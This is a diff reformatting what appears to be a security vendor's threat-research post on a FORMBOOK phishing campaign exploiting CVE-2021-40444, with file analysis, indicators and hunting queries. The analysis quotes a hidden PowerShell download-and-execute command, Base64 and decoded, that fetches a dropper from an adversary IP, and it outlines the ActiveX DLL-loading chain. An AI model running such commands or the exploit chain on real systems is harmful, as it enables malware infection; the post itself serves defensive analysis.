@@ -41,7 +41,7 @@ campaign variations.
 
 ## Key Takeaways
 
-* The speed at which vulnerability PoC’s are being released highlights the need to leverage threat hunting to identify
+* The speed at which vulnerability PoC's are being released highlights the need to leverage threat hunting to identify
   post-exploitation events before patches can be applied
 * A FORMBOOK campaign was observed combining infrastructure that allowed testing and production phases to be linked together
 * Patching for the MSHTML exploit appears to be effective as the campaign shifted from attempting to use the exploit to
@@ -80,7 +80,7 @@ At a high level, an attacker could craft a malicious ActiveX control to be used 
 allow for code to be remotely executed on a victim machine. While this vulnerability is well documented, security
 researcher [Edubr2020](https://twitter.com/Edu_Braun_0day) did a
 [fantastic job](https://github.com/Edubr2020/CVE-2021-40444--CABless) of explaining how the exploit works in a default
-configuration, as well as a more clever “CABless” approach. Our telemetry observed both the default configuration and
+configuration, as well as a more clever "CABless" approach. Our telemetry observed both the default configuration and
 the CABless approach. We describe these in detail below.
 
 We initiated several collection techniques simultaneously, including searching for malicious attachments that would be
@@ -97,13 +97,13 @@ The next following sections will break down these different campaign sightings a
 
 !!! important
 
-        Throughout the Details section, it is important to note a few things that are required for this attack chain to
-        function, irrespective of the Testing or Production phases
+    Throughout the Details section, it is important to note a few things that are required for this attack chain to
+    function, irrespective of the Testing or Production phases
 
-        1. _A major challenge for the campaign is to get a DLL file onto the victim system_
-        2. _ActiveX controls are DLL files with special constraints_
-        3. _Web pages can link ActiveX controls directly or load files that are contained in a URL — this is not
-           recommended by Microsoft because file signatures cannot be validated_
+    1. _A major challenge for the campaign is to get a DLL file onto the victim system_
+    2. _ActiveX controls are DLL files with special constraints_
+    3. _Web pages can link ActiveX controls directly or load files that are contained in a URL — this is not
+        recommended by Microsoft because file signatures cannot be validated_
 
 ### Testing phase
 
@@ -134,7 +134,7 @@ email-attachment: Microsoft Word 2007+
 ```
 
 Microsoft Office documents, post-2007, are compressed archives. To dig into the document without opening it, you can
-decompress the file using the “unzip” command as illustrated above.
+decompress the file using the "unzip" command as illustrated above.
 
 ```text title="Decompressing the email attachment"
 $ unzip email-attachment
@@ -173,11 +173,11 @@ Target="MHTML:&#x48;&#x54;&#x54;&#x50;&#x3a;&#x5c;&#x5c;&#x31;&#x30;&#x34;&#x2e;
 From here, we can see an externally linked MHTML OLE object inside an element using [HTML entities](https://www.w3schools.com/html/html_entities.asp),
 which reserve characters in HTML. HTML entities are natively not human readable, so they need to be decoded. Using the
 data analyzer and decoder from the United Kingdom's Government Communications Headquarters (GCHQ), [CyberChef](https://gchq.github.io/CyberChef/),
-we were able to quickly decode the HTML entities with the “From HTML Entity” recipe (CyberChef recipes are pre-configured
+we were able to quickly decode the HTML entities with the "From HTML Entity" recipe (CyberChef recipes are pre-configured
 data parsers and decoders).
 
 The decoded HTML entity was `HTTP:\\104[.]244[.]78[.]177\Pope.txt`. This provided us with another atomic indicator to
-add to the `admin0011[@]issratech.com` email address we’d previously collected, `104[.]244[.]78[.]177`. Additionally,
+add to the `admin0011[@]issratech.com` email address we'd previously collected, `104[.]244[.]78[.]177`. Additionally,
 the decoded HTML entity revealed another file that could be of interest, `Pope.txt`.
 
 ![Decoded HTML entity from the email attachment](media/decoded-html-entity-from-the-email-attachment.png "Decoded HTML entity from the email attachment")
@@ -193,16 +193,19 @@ variable renaming and string obfuscation. This JavaScript performs the following
 * Uses the CVE-2021-40444 vulnerability with the ActiveX objects to perform directory traversal and execute a file called
   `IEcache.inf`. This filename is the [DLL loader](https://github.com/aslitsecurity/CVE-2021-40444_builders/blob/main/CVE-2021-40444/IEcache.inf)
   from the [ASL IT Security PoC code](https://github.com/aslitsecurity/CVE-2021-40444_builders/blob/main/CVE-2021-40444/IEcache.inf)
-  and doesn’t exist in this test run
+  and doesn't exist in this test run
 
 ![Obfuscated JavaScript file](media/obfuscated-javascript-file.png "Obfuscated JavaScript file")
 
 The above figure shows the notable section of the obfuscated JavaScript code. We used a debugger to parse out the results
-of the lookup functions (shown commented out with `//`’s). This revealed the `classid` (`CLSID:edbc374c-5730-432a-b5b8-de94f0b57217`)
+of the lookup functions (shown commented out with `//`'s). This revealed the `classid` (`CLSID:edbc374c-5730-432a-b5b8-de94f0b57217`)
 attribute which appears across the web in various other malware analyses of CVE-2021-40444. This suggests with moderate
-confidence that this JavaScript was crafted using some repurposed code that has been open-sourced. The `classid` attribute is used to determine if `comres.cab` has already been downloaded — if it has, it won’t attempt to download it again.
+confidence that this JavaScript was crafted using some repurposed code that has been open-sourced. The `classid` attribute
+is used to determine if `comres.cab` has already been downloaded — if it has, it won't attempt to download it again.
 
-Once `comres.cab` is downloaded and extracted, the extracted file must be located. This is why there are multiple directory execution attempts observed in JavaScript. All the work up to this point is to get the DLL (`IEcache.inf`) onto the filesystem. Finally, the DLL file would be executed as a control panel file (`.cpl`), because control panel files can be loaded as DLLs.
+Once `comres.cab` is downloaded and extracted, the extracted file must be located. This is why there are multiple directory
+execution attempts observed in JavaScript. All the work up to this point is to get the DLL (`IEcache.inf`) onto the filesystem.
+Finally, the DLL file would be executed as a control panel file (`.cpl`), because control panel files can be loaded as DLLs.
 
 ![Elastic Analyzer showing attempts to execute IEcache.inf](media/elastic-analyzer-showing-attempts-to-execute-iecache.png "Elastic Analyzer showing attempts to execute IEcache.inf")
 
@@ -210,7 +213,10 @@ Once `comres.cab` is downloaded and extracted, the extracted file must be locate
 
 In our sample, `comres.cab` does not include the ASL IT Security PoC DLL (`IEcache.inf`). It included a file called `1.doc.inf`.
 
-From `comres.cab` we used the file archive utility, 7-Zip, to extract `1.doc.inf`. This file is interesting because it has the `.inf` ([setup information file](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/overview-of-inf-files)) extension, but in using the `file` command, we can see that it is actually a DLL file, meaning that the file type is being obfuscated.
+From `comres.cab` we used the file archive utility, 7-Zip, to extract `1.doc.inf`. This file is interesting because it
+has the `.inf` ([setup information file](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/overview-of-inf-files))
+extension, but in using the `file` command, we can see that it is actually a DLL file, meaning that the file type is
+being obfuscated.
 
 ```text title="Collecting 1.doc.inf from comres.cab"
 $ 7z e comres.cab
@@ -242,7 +248,9 @@ $ file 1.doc.inf
 1.doc.inf: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows
 ```
 
-When analyzing the [import address table](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#import-address-table) (IAT) of `1.doc.inf`, we observed multiple API functions, which would allow the file to download and execute additional files. Of particular note were the `ShellExecuteExA` and `URLDownloadToFileW` API functions.
+When analyzing the [import address table](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#import-address-table)
+(IAT) of `1.doc.inf`, we observed multiple API functions, which would allow the file to download and execute additional
+files. Of particular note were the `ShellExecuteExA` and `URLDownloadToFileW` API functions.
 
 ```text title="1.doc.inf import table"
 === IMPORTS ===
@@ -275,7 +283,9 @@ PSAPI.DLL           0        GetModuleFileNameExW
                     0        GetUserObjectInformationW
 ```
 
-Through further analysis of the DLLs sections list, we identified that the file was protected with [VMProtect](https://vmpsoft.com/) (identified by the `.vmp0`, `.vmp1`, `.vmp2`, `.vmp3` sections). “VMProtect protects code by executing it on a virtual machine with non-standard architecture that makes it extremely difficult to analyze.”
+Through further analysis of the DLLs sections list, we identified that the file was protected with [VMProtect](https://vmpsoft.com/)
+(identified by the `.vmp0`, `.vmp1`, `.vmp2`, `.vmp3` sections). "VMProtect protects code by executing it on a virtual
+machine with non-standard architecture that makes it extremely difficult to analyze."
 
 ```text title="Viewing the sections of 1.doc.inf"
 $ pedump --sections 1.doc.inf | awk '{print $1, $2, $3, $4}'
@@ -294,17 +304,22 @@ NAME    RVA    VSZ    RAW_SZ
 .reloc  aa8000 5b4    600
 ```
 
-As we were unable to analyze the VMProtected file, we continued to explore other information that we’d previously collected. Specifically, we searched for additional samples that had been sent using the same `admin0011[@]issratech.com` email address. These parallel analyses identified additional samples and campaign phases, which we’re referring to as the Production and Generic phases.
+As we were unable to analyze the VMProtected file, we continued to explore other information that we'd previously collected.
+Specifically, we searched for additional samples that had been sent using the same `admin0011[@]issratech.com` email address.
+These parallel analyses identified additional samples and campaign phases, which we're referring to as the Production
+and Generic phases.
 
 ### Production phase
 
-The second, third, and fourth sightings all had the same sender field of `admin0011[@]issratech.com` and included a single attachment — `Profile.rar` file — to deliver the second stage malware.
+The second, third, and fourth sightings all had the same sender field of `admin0011[@]issratech.com` and included a
+single attachment — `Profile.rar` file — to deliver the second stage malware.
 
 ![Production phase lure email](media/production-phase-lure-email.png "Production phase lure email")
 
 #### Profile.rar
 
-Previously, we’ve highlighted files that have an extension that differs from their actual file type. To validate that the attachment is a RAR archive, we again use the `file` command to validate that it is a RAR archive.
+Previously, we've highlighted files that have an extension that differs from their actual file type. To validate that
+the attachment is a RAR archive, we again use the `file` command to validate that it is a RAR archive.
 
 ```text title="Verifying email attachment file type"
 $ file Profile.rar
@@ -312,7 +327,9 @@ $ file Profile.rar
 Profile.rar: data
 ```
 
-The attachment has a RAR file extension, but instead of having a file type of `RAR archive data, v5`, it is raw `data`. Analysts who discover a file containing raw data can use the `less` command to dump the file contents to `STDOUT` to directly inspect what may be inside.
+The attachment has a RAR file extension, but instead of having a file type of `RAR archive data, v5`, it is raw `data`.
+Analysts who discover a file containing raw data can use the `less` command to dump the file contents to `STDOUT` to
+directly inspect what may be inside.
 
 ```text title="Profile.rar dumped to STDOUT"
 $ less Profile.rar
@@ -323,21 +340,21 @@ WshShell.Run "cmd /c " & runCmd, 0, True</script></job> Rar!...truncated...
 
 The raw data includes a script job element that can be natively interpreted by the Windows Script Host (WSH). The job
 element directs WSH to spawn a shell that spawns a hidden PowerShell process which then runs a Base64 encoded PowerShell
-script. However, the script job element needs to be executed, which isn’t done by double-clicking on the file.
+script. However, the script job element needs to be executed, which isn't done by double-clicking on the file.
 
 Decoding this string, we can see that a file called `abb01.exe` is downloaded and executed from `104[.]244[.]78[.]177`.
 This is the same IP address we have observed across all Testing and Production phases.
 
 ```bash title="Decoded PowerShell command"
-$ echo "aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwADQALgAyADQANAAuADcAOAAuADEANwA3AC8AYQBiAGIAMAAxAC4AZQB4AGUAIgAsACIAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEAVABBAFwAZABsAGwAaABvAHMAdABTAHYAYwAuAGUAeABlACIAKQApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEAVABBAFwAZABsAGwAaABvAHMAdABTAHYAYwAuAGUAeABlACIA" | base64 -D
+echo "aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwADQALgAyADQANAAuADcAOAAuADEANwA3AC8AYQBiAGIAMAAxAC4AZQB4AGUAIgAsACIAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEAVABBAFwAZABsAGwAaABvAHMAdABTAHYAYwAuAGUAeABlACIAKQApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEAVABBAFwAZABsAGwAaABvAHMAdABTAHYAYwAuAGUAeABlACIA" | base64 -D
 ```
 
-```powershell title="Resulting powershell output (defanged)"
+```powershell title="Resulting powershell output (defanged)
 iex ((new-object system.net.webclient).downloadfile("http://104[.]244[.]78[.]177/abb01.exe","$env:LOCALAPPDATA\dllhostSvc.exe"));Start-Process "$env:LOCALAPPDATA\dllhostSvc.exe"
 ```
 
-We’ll continue to explore this file to identify how the script job is executed. As we displayed above, the file still
-has the `Rar!` header, so we can decompress this archive. First, we’ll use the `unrar` program to decompress the RAR
+We'll continue to explore this file to identify how the script job is executed. As we displayed above, the file still
+has the `Rar!` header, so we can decompress this archive. First, we'll use the `unrar` program to decompress the RAR
 archive and retrieve the contents:  `document.docx`.
 
 ```shell title="Decompressing Profile.rar"
@@ -426,13 +443,13 @@ and remains a successful tool for stealing information.
 ### Generic phase
 
 On October 28 and November 8, 2021, we observed additional sightings but used a generic phishing attachment tactic to
-load FORMBOOK. Additionally, we were able to collect some information from the email header that we’ll discuss in the
+load FORMBOOK. Additionally, we were able to collect some information from the email header that we'll discuss in the
 Campaign Analysis section.
 
 ![Generic phase lure email](media/generic-phase-lure-email.png "Generic phase lure email")
 
 These sightings all have two RAR attachments. One of the attachments has a `.rar` file extension and the other has either
-a `.gz` or `.7z` extension. We’ll explore one of the sightings below.
+a `.gz` or `.7z` extension. We'll explore one of the sightings below.
 
 ```text title="Verifying file types of the email attachments"
 $ file D2110-095.gz DWG.rar
@@ -497,7 +514,7 @@ Other phases included custom exploit code that differed from the PoC code but sh
 and [execution](https://attack.mitre.org/techniques/T1203) TTPs as well as the same network infrastructure.
 
 We observed that the `issratech[.]com`, `backsjoy[.]com`, and `leoeni[.]com` domains own  TLS certificates provided by
-Let’s Encrypt. While the steps of creating a TLS certificate are not overly cumbersome, the fact that the domain owner went
+Let's Encrypt. While the steps of creating a TLS certificate are not overly cumbersome, the fact that the domain owner went
 through the preparatory process of creating a certificate could indicate that these domains are intended to be used for
 future encrypted operations.
 
@@ -572,7 +589,7 @@ Observed techniques/sub techniques
 
 ### Hunting queries
 
-These queries can be used in Kibana’s Security → Timelines → New Timeline → Correlation query editor. While these queries
+These queries can be used in Kibana's Security → Timelines → New Timeline → Correlation query editor. While these queries
 will identify this intrusion set, they can also identify other events of note that, once investigated, could lead to
 other malicious activities.
 
@@ -653,246 +670,29 @@ The following research was referenced throughout the document:
 <!-- TODO -->
 We will post all the indicators in the form of a STIX 2.1 JSON document soon.
 
-<table>
-  <tr>
-   <td>Indicator
-   </td>
-   <td>Type
-   </td>
-   <td>Reference from blog
-   </td>
-   <td>Note
-   </td>
-  </tr>
-  <tr>
-   <td><code>70defbb4b846868ba5c74a526405f2271ab71de01b24fbe2d6db2c7035f8a7df</code>
-   </td>
-   <td>SHA256
-   </td>
-   <td>Request Document.docx
-   </td>
-   <td>Testing phase email attachment
-   </td>
-  </tr>
-  <tr>
-   <td><code>7c98db2063c96082021708472e1afb81f3e54fe6a4a8b8516e22b3746e65433b</code>
-   </td>
-   <td>SHA256
-   </td>
-   <td>comres.cab
-   </td>
-   <td>Testing phase CAB archive
-   </td>
-  </tr>
-  <tr>
-   <td><code>363837d5c41ea6b2ff6f6184d817c704e0dc5749e45968a3bc4e45ad5cf028d7</code>
-   </td>
-   <td>SHA256
-   </td>
-   <td>1.doc.inf
-   </td>
-   <td>Testing phase VMProtect DLL
-   </td>
-  </tr>
-  <tr>
-   <td><code>22cffbcad42363841d01cc7fef290511c0531aa2b4c9ca33656cc4aef315e723</code>
-   </td>
-   <td>SHA256
-   </td>
-   <td>IEcache.inf
-   </td>
-   <td>Testing phase DLL loader
-   </td>
-  </tr>
-  <tr>
-   <td><code>e2ab6aab7e79a2b46232af87fcf3393a4fd8c4c5a207f06fd63846a75e190992</code>
-   </td>
-   <td>SHA256
-   </td>
-   <td>Pope.txt
-   </td>
-   <td>Testing phase JavaScript
-   </td>
-  </tr>
-  <tr>
-   <td><code>170eaccdac3c2d6e1777c38d61742ad531d6adbef3b8b031ebbbd6bc89b9add6</code>
-   </td>
-   <td>SHA256
-   </td>
-   <td>Profile.rar
-   </td>
-   <td>Production phase email attachment
-   </td>
-  </tr>
-  <tr>
-   <td><code>d346b50bf9df7db09363b9227874b8a3c4aafd6648d813e2c59c36b9b4c3fa72</code>
-   </td>
-   <td>SHA256
-   </td>
-   <td>document.docx
-   </td>
-   <td>Production phase compressed document
-   </td>
-  </tr>
-  <tr>
-   <td><code>776df245d497af81c0e57fb7ef763c8b08a623ea044da9d79aa3b381192f70e2</code>
-   </td>
-   <td>SHA256
-   </td>
-   <td>abb01.exe
-   </td>
-   <td>Production phase dropper
-   </td>
-  </tr>
-  <tr>
-   <td><code>95e03836d604737f092d5534e68216f7c3ef82f529b5980e3145266d42392a82</code>
-   </td>
-   <td>SHA256
-   </td>
-   <td>Profile.html
-   </td>
-   <td>Production phase JavaScript
-   </td>
-  </tr>
-  <tr>
-   <td><code>bd1c1900ac1a6c7a9f52034618fed74b93acbc33332890e7d738a1d90cbc2126</code>
-   </td>
-   <td>SHA256
-   </td>
-   <td>yxojzzvhi0.exe
-   </td>
-   <td>FORMBOOK malware
-   </td>
-  </tr>
-  <tr>
-   <td><code>0c560d0a7f18b46f9d750e24667721ee123ddd8379246dde968270df1f823881</code>
-   </td>
-   <td>SHA256
-   </td>
-   <td>DWG.rar
-   </td>
-   <td>Generic phase email attachment
-   </td>
-  </tr>
-  <tr>
-   <td><code>5a1ef64e27a8a77b13229b684c09b45a521fd6d4a16fdb843044945f12bb20e1</code>
-   </td>
-   <td>SHA256
-   </td>
-   <td>D2110-095.gz
-   </td>
-   <td>Generic phase email attachment
-   </td>
-  </tr>
-  <tr>
-   <td><code>4216ff4fa7533209a6e50c6f05c5216b8afb456e6a3ab6b65ed9fcbdbd275096</code>
-   </td>
-   <td>SHA256
-   </td>
-   <td>D2110-095.exe \
-DWG.exe
-   </td>
-   <td>FORMBOOK malware
-   </td>
-  </tr>
-  <tr>
-   <td><code>admin0011[@]issratech.com</code>
-   </td>
-   <td>Email address
-   </td>
-   <td>
-   </td>
-   <td>Phishing sending email address
-   </td>
-  </tr>
-  <tr>
-   <td><code>admin010[@]backsjoy.com</code>
-   </td>
-   <td>Email address
-   </td>
-   <td>
-   </td>
-   <td>Phishing sending email address
-   </td>
-  </tr>
-  <tr>
-   <td><code>admin012[@]leoeni.com</code>
-   </td>
-   <td>Email address
-   </td>
-   <td>
-   </td>
-   <td>Phishing sending email address
-   </td>
-  </tr>
-  <tr>
-   <td><code>issratech[.]com</code>
-   </td>
-   <td>Domain name
-   </td>
-   <td>
-   </td>
-   <td>Adversary controlled domain
-   </td>
-  </tr>
-  <tr>
-   <td><code>backsjoy[.]com</code>
-   </td>
-   <td>Domain name
-   </td>
-   <td>
-   </td>
-   <td>Adversary controlled domain
-   </td>
-  </tr>
-  <tr>
-   <td><code>leonei[.]com</code>
-   </td>
-   <td>Domain name
-   </td>
-   <td>
-   </td>
-   <td>Adversary controlled domain
-   </td>
-  </tr>
-  <tr>
-   <td><code>2[.]56[.]59[.]105</code>
-   </td>
-   <td>IP Address
-   </td>
-   <td>
-   </td>
-   <td>IP address of <code>issratech[.]com</code>
-   </td>
-  </tr>
-  <tr>
-   <td><code>212[.]192[.]241[.]173</code>
-   </td>
-   <td>IP Address
-   </td>
-   <td>
-   </td>
-   <td>IP address of <code>backsjoy[.]com</code>
-   </td>
-  </tr>
-  <tr>
-   <td><code>52[.]128[.]23[.]153</code>
-   </td>
-   <td>IP Address
-   </td>
-   <td>
-   </td>
-   <td>IP address of <code>leonei[.]com</code>
-   </td>
-  </tr>
-  <tr>
-   <td><code>104[.]244[.]78[.]177</code>
-   </td>
-   <td>IP Address
-   </td>
-   <td>
-   </td>
-   <td>Adversary controlled IP address
-   </td>
-  </tr>
-</table>
+Indicator                                                          | Type        | Reference from blog     | Note
+-------------------------------------------------------------------|-------------|-------------------------|-------------------------------------
+`70defbb4b846868ba5c74a526405f2271ab71de01b24fbe2d6db2c7035f8a7df` | SHA256      | Request Document.docx   | Testing phase email attachment
+`7c98db2063c96082021708472e1afb81f3e54fe6a4a8b8516e22b3746e65433b` | SHA256      | comres.cab              | Testing phase CAB archive
+`363837d5c41ea6b2ff6f6184d817c704e0dc5749e45968a3bc4e45ad5cf028d7` | SHA256      | 1.doc.inf               | Testing phase VMProtect DLL
+`22cffbcad42363841d01cc7fef290511c0531aa2b4c9ca33656cc4aef315e723` | SHA256      | IEcache.inf             | Testing phase DLL loader
+`e2ab6aab7e79a2b46232af87fcf3393a4fd8c4c5a207f06fd63846a75e190992` | SHA256      | Pope.txt                | Testing phase JavaScript
+`170eaccdac3c2d6e1777c38d61742ad531d6adbef3b8b031ebbbd6bc89b9add6` | SHA256      | Profile.rar             | Production phase email attachment
+`d346b50bf9df7db09363b9227874b8a3c4aafd6648d813e2c59c36b9b4c3fa72` | SHA256      | document.docx           | Production phase compressed document
+`776df245d497af81c0e57fb7ef763c8b08a623ea044da9d79aa3b381192f70e2` | SHA256      | abb01.exe               | Production phase dropper
+`95e03836d604737f092d5534e68216f7c3ef82f529b5980e3145266d42392a82` | SHA256      | Profile.html            | Production phase JavaScript
+`bd1c1900ac1a6c7a9f52034618fed74b93acbc33332890e7d738a1d90cbc2126` | SHA256      | yxojzzvhi0.exe          | FORMBOOK malware
+`0c560d0a7f18b46f9d750e24667721ee123ddd8379246dde968270df1f823881` | SHA256      | DWG.rar                 | Generic phase email attachment
+`5a1ef64e27a8a77b13229b684c09b45a521fd6d4a16fdb843044945f12bb20e1` | SHA256      | D2110-095.gz            | Generic phase email attachment
+`4216ff4fa7533209a6e50c6f05c5216b8afb456e6a3ab6b65ed9fcbdbd275096` | SHA256      | D2110-095.exe \ DWG.exe | FORMBOOK malware
+`admin0011[@]issratech.com`                                        | email-addr  |                         | Phishing sending email address
+`admin010[@]backsjoy.com`                                          | email-addr  |                         | Phishing sending email address
+`admin012[@]leoeni.com`                                            | email-addr  |                         | Phishing sending email address
+`issratech[.]com`                                                  | domain-name |                         | Adversary controlled domain
+`backsjoy[.]com`                                                   | domain-name |                         | Adversary controlled domain
+`leonei[.]com`                                                     | domain-name |                         | Adversary controlled domain
+`2[.]56[.]59[.]105`                                                | ipv4-addr   |                         | IP address of issratech[.]com
+`212[.]192[.]241[.]173`                                            | ipv4-addr   |                         | IP address of backsjoy[.]com
+`52[.]128[.]23[.]153`                                              | ipv4-addr   |                         | IP address of leonei[.]com
+`104[.]244[.]78[.]177`                                             | ipv4-addr   |                         | Adversary controlled IP address
+
